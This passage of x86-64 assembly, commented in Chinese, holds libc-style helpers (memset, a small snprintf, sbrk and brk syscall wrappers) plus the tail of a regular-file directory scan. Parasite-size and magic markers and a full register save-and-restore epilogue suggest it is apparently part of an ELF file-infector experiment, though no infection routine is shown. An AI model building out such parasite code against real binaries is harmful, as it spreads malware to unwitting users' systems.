         jmp ._start_out_get_dirent_bpos
        




         
        





        /*****************end of process DT_REG***************************************/
        jmp ._start_out_get_dirent_bpos
        
    ._start_out_get_dirent_bpos_out:
        jmp ._start_get_dirent 

._start_out_get_dirent:
jmp ._start_endl 





/*********************************osis_memset_rax function****************************************/
osis_memset_rax:
/* The userland implementation is:
   int osis_memset_rax(void* s[.n], int c, size_t n);


   The parameters are passed in register from userland:
   rdi: s
   rsi: c
   rdx: n

*/
.type osis_memset_rax @function
.globl osis_memset_rax

push %rbp
mov %rsp,%rbp
andq $0xfffffffffffffff0,%rsp
mov  %rdi,%rcx
mov %rdx, %r9
mov %rdx, %r10
movzbq %sil, %rax
mov $0x0101010101010101,%r8
imulq %rax,%r8  # 使用 imulq 指令，64 位常数
cmpq  $8,%r9
jl .omr_001
.omr_000:
movq    %r8, (%rdi)
subq $8,%r9
addq $8, %rdi 
cmpq $8, %r9
jl .omr_001
jmp .omr_000
jmp osis_memset_rax_endl

.omr_001:
xor %rax,%rax
xor %rdx,%rdx
mov %r9w,%ax
movq $8,%r11
divq %r11
cmp $0,%rdx
je .omr_001_0
cmp $1,%rdx
je .omr_001_1
cmp $2,%rdx
je .omr_001_2
cmp $3,%rdx
je .omr_001_3
cmp $4,%rdx
je .omr_001_4
cmp $5,%rdx
je .omr_001_5
cmp $6,%rdx
je .omr_001_6
cmp $7,%rdx
je .omr_001_7
.omr_001_0:
mov %rcx,%rax
jmp osis_memset_rax_endl
.omr_001_1:
movb %r8b, (%rdi) 
mov %rcx,%rax
jmp osis_memset_rax_endl
.omr_001_2:
movw %r8w, (%rdi) 
mov %rcx,%rax
jmp osis_memset_rax_endl
.omr_001_3:
movw %r8w, 1(%rdi)
movb %r8b, (%rdi)  
mov %rcx,%rax
jmp osis_memset_rax_endl
.omr_001_4:
movl %r8d, (%rdi) 
mov %rcx,%rax
jmp osis_memset_rax_endl
.omr_001_5:
movl %r8d, 1(%rdi) 
movb %r8b, (%rdi) 
mov %rcx,%rax
jmp osis_memset_rax_endl
.omr_001_6:
movl %r8d, 2(%rdi) 
movw %r8w, (%rdi) 
mov %rcx,%rax
jmp osis_memset_rax_endl
.omr_001_7:
movl %r8d, 3(%rdi) 
movw %r8w, 1(%rdi)
movb %r8b, (%rdi)  
mov %rcx,%rax
jmp osis_memset_rax_endl

osis_memset_rax_endl:
mov %rbp,%rsp
pop %rbp
ret

/********************************end of osis_memset_rax**************************************/

/*********************************osis_snprintf  function****************************************/
/* osis_snprintf 函数实现
rdi: 目标缓冲区
rsi: 缓冲区大小
rdx: 格式化字符串
rcx: 第一个变参（简化版）仅支持 %d, %s, %x 格式
*/
.type osis_snprintf @function
.global osis_snprintf
osis_snprintf:
    # 保存栈帧
    pushq %rbp
    movq %rsp, %rbp
    andq $0xfffffffffffffff0,%rsp
    
    # 保存需要保存的寄存器
    pushq %r12
    pushq %r13
    pushq %r14
    pushq %r15
    # 保存参数
    movq %rdi, %r12     # 目标缓冲区
    movq %rsi, %r13     # 缓冲区大小
    movq %rdx, %r14     # 格式化字符串
    movq %rcx, %r15     # 第一个参数
     # 初始化
   xorq %r8, %r8       # 已写入字符计数
   parse_format:
    # 检查是否到达字符串结尾
    cmpb $0, (%r14)
    je done
    
    # 检查缓冲区是否已满
    cmpq %r13, %r8
    jae done
    
    # 检查是否是格式说明符
    cmpb $'%', (%r14)
    je handle_format
    
    # 普通字符直接复制
    movb (%r14), %al
    movb %al, (%r12)
    incq %r12
    incq %r14
    incq %r8
    jmp parse_format

handle_format:
    incq %r14
    
    # 检查 %d
    cmpb $'d', (%r14)
    je handle_decimal
    
    # 检查 %s
    cmpb $'s', (%r14)
    je handle_string
    
    # 检查 %x
    cmpb $'x', (%r14)
    je handle_hex
    
    # 非法格式，跳过
    jmp parse_format

handle_decimal:
    # 转换整数
    movq %r15, %rdi     # 第一个参数作为转换对象
    movq %r12, %rsi     # 目标缓冲区
    call int_to_string
    
    # 更新计数器和缓冲区指针
    addq %rax, %r8
    addq %rax, %r12
    
    incq %r14           # 跳过 'd'
    jmp parse_format

handle_string:
    # 处理字符串
    movq %r15, %rdi     # 字符串指针
    movq %r12, %rsi     # 目标缓冲区
    /***************modify by owen jiang for buffer len**************/
    #movq %r13, %rdx     # 剩余缓冲区大小 comment by owen jiang
    push %r9
    xor %r9,%r9
    mov %r13,%r9
    sub %r8,%r9 
    mov %r9,%rdx 
    pop %r9 
    /**********************************************************************************/
    call copy_string
    
    # 更新计数器和缓冲区指针
    addq %rax, %r8
    addq %rax, %r12
    
    incq %r14           # 跳过 's'
    jmp parse_format

handle_hex:
    # 转换十六进制
    movq %r15, %rdi     # 第一个参数作为转换对象
    movq %r12, %rsi     # 目标缓冲区
    call hex_to_string
    
    # 更新计数器和缓冲区指针
    addq %rax, %r8
    addq %rax, %r12
    
    incq %r14           # 跳过 'x'
    jmp parse_format

done:
    # 添加字符串结尾
    movb $0, (%r12)
    
    # 返回写入的字符数
    movq %r8, %rax
    
    # 恢复寄存器
    popq %r15
    popq %r14
    popq %r13
    popq %r12
    
    # 恢复栈帧
    movq %rbp, %rsp
    popq %rbp
    ret

# 字符串复制函数
# rdi: 源字符串
# rsi: 目标缓冲区
# rdx: 剩余缓冲区大小
# 返回：复制的字符数
copy_string:
    pushq %rbp
    movq %rsp, %rbp
    
    xorq %rax, %rax     # 计数器
    
copy_loop:
    # 检查是否到达字符串结尾
    cmpb $0, (%rdi)
    je copy_done
    
    # 检查缓冲区是否已满
    cmpq %rdx, %rax
    jae copy_done
    
    # 复制字符
    movb (%rdi), %cl
    movb %cl, (%rsi)
    
    # 更新指针和计数器
    incq %rdi
    incq %rsi
    incq %rax
    
    jmp copy_loop

copy_done:
    movq %rbp, %rsp
    popq %rbp
    ret

# 十六进制转换函数
# rdi: 要转换的整数
# rsi: 目标缓冲区
# 返回：转换的字符数
hex_to_string:
    pushq %rbp
    movq %rsp, %rbp
    andq $0xfffffffffffffff0,%rsp
    
    # 分配本地缓冲区
    subq $32, %rsp
    
    # 保存目标缓冲区
    movq %rsi, %r10
    
    # 转换整数到十六进制字符串（反向）
    leaq -1(%rbp), %r9  # 临时缓冲区末尾
    movq %rdi, %rax
    movq $16, %rcx
convert_hex_digit:
    movq %rax, %rdx
    andq $0xf, %rdx     # 取低4位
    
    # 转换为十六进制字符
    cmpq $10, %rdx
    jl numeric_hex
    addb $'a'-10, %dl   # 处理 a-f
    jmp store_hex_digit
numeric_hex:
    addb $'0', %dl      # 处理 0-9
store_hex_digit:
    movb %dl, (%r9)
    decq %r9
    
    shrq $4, %rax       # 右移4位
    testq %rax, %rax
    jnz convert_hex_digit
    
    # 复制转换后的字符串
    incq %r9
    
    # 计算字符串长度
    leaq -1(%rbp), %rcx
    subq %r9, %rcx
    incq %rcx
    /****add by owen jiang  for check len of buffer *****/
    push %r9
    xor %r9,%r9
    mov %r13,%r9
    sub %r8,%r9
    cmpq %rcx,%r9
    jae .osis_snprintf_store_hex_digit_check2
    mov %r9,%rcx 

    .osis_snprintf_store_hex_digit_check2: 
    pop %r9 
    /******************************/
    
    # 复制到目标缓冲区
    mov %rsi,%rdi
    mov %r9,%rsi
    mov %rcx,%rax
    cld
    rep movsb
    
    # 恢复栈帧
    movq %rbp, %rsp
    popq %rbp
    ret

# 之前的 int_to_string 函数保持不变
int_to_string:
    # 保存栈帧
    pushq %rbp
    movq %rsp, %rbp
    andq $0xfffffffffffffff0,%rsp
    
    # 分配本地缓冲区
    subq $32, %rsp
    
    # 保存目标缓冲区
    movq %rsi, %r10
    
    # 处理负数
    xorq %r11, %r11     # 符号标志
    testq %rdi, %rdi
    jns positive
    
    # 负数处理
    movb $'-', (%r10)
    incq %r10
    incq %r11
    negq %rdi

positive:
    # 转换整数到字符串（反向）
    leaq -1(%rbp), %r9  # 临时缓冲区末尾
    movq %rdi, %rax
    movq $10, %rcx

convert_digit:
    xorq %rdx, %rdx
    divq %rcx
    addb $'0', %dl
    movb %dl, (%r9)
    decq %r9
    
    testq %rax, %rax
    jnz convert_digit
    
    # 复制转换后的字符串
    incq %r9
    
    # 计算字符串长度
    leaq -1(%rbp), %rcx
    subq %r9, %rcx
    incq %rcx
    /****add by owen jiang  for check len of buffer *****/
    push %r9
    xor %r9,%r9
    mov %r13,%r9
    sub %r8,%r9
    cmpq %rcx,%r9
    jae .osis_snprintf_convert_digit_check1
    mov %r9,%rcx 

    .osis_snprintf_convert_digit_check1: 
    pop %r9 
    /******************************/
    
    # 复制到目标缓冲区
    mov %rsi,%rdi
    mov %r9,%rsi
    mov %rcx,%rax
    cld
    rep movsb
    
    # 返回写入的字符数
    #movq %rcx, %rax
    
    # 恢复栈帧
    movq %rbp, %rsp
    popq %rbp
    ret

/********************************end of osis_snprintf**************************************/


/********************************osis_sbrk func*******************************************/
/* osis_sbrk 函数实现
rdi: intptr_t inc
*/
.type osis_sbrk @function
.global osis_sbrk
osis_sbrk:
        pushq %rbp
        movq %rsp, %rbp
        andq $0xfffffffffffffff0,%rsp
        mov    %rdi,%rsi
        movl    $0x0,%edi
        callq  osis_sys_brk
        mov    %rax,%r8
        test   %rax,%rax
        je     .osis_sbrk_err

        add    %rsi,%rax
        mov    %rax,%rdi
        mov    %rax,%r9
        callq  osis_sys_brk

        cmp    %r9,%rax
        jne    .osis_sbrk_err
        jmp   .osis_sbrk_endl
        .osis_sbrk_err:
        mov    $0xffffffffffffffff,%rax

        .osis_sbrk_endl:
        movq %rbp, %rsp
        popq %rbp
        ret


/********************************end of osis_sbrk func*******************************************/

/********************************osis_sys_brk func*******************************************/
/* osis_sbrk 函数实现
rdi: void* addr
*/
.type osis_sys_brk @function
.global osis_sys_brk
osis_sys_brk:
    pushq %rbp
    movq %rsp, %rbp
    andq $0xfffffffffffffff0,%rsp
    #mov    %rdi,-0x28(%rbp)#redzone
    movl    $0xc,%eax
    syscall
    movq %rbp, %rsp
    popq %rbp
    ret



/********************************end of osiosis_sys_brks_sbrk func*******************************************/

/********************************osis_brk func*******************************************/
/* osis_brk 函数实现
rdi: void* addr
*/
.type osis_brk @function
.global osis_brk
osis_brk:
    pushq %rbp
    movq %rsp, %rbp
    andq $0xfffffffffffffff0,%rsp
    #mov    %rdi,-0x28(%rbp)#redzone
    movl    $0xc,%eax
    syscall
    test %rax,%rax
    je .osis_brk_err 
    xor %rax,%rax
    jmp osis_brk_endl 
    .osis_brk_err:
    mov    $0xffffffffffffffff,%rax
    osis_brk_endl:
    movq %rbp, %rsp
    popq %rbp
    ret



/********************************end of osis_brk func*******************************************/


osis_reverst_id:.ascii "This is a  identification msg by osis_reverse_text_test.\n"
osis_reverst_id_end:
.equ osis_reverst_id_len,osis_reverst_id_end-osis_reverst_id
osis_reverse_parasite_size:
.quad 0x1234567890
osis_reverse_magic:
.quad 0x9876543210
.align 16
._start_endl:
mov %rbp,%rsp
pop %rbp
popfq
pop %r15
pop %r14
pop %r13
pop %r12
pop %r11
pop %r10
pop %r9
pop %r8
pop %rsi
pop %rdi
pop %rdx
pop %rcx
pop %rbx
pop %rax
.align 16
._start_endl_exit:
xor %rdi,%rdi       
movq $60, %rax   
syscall
.align 16
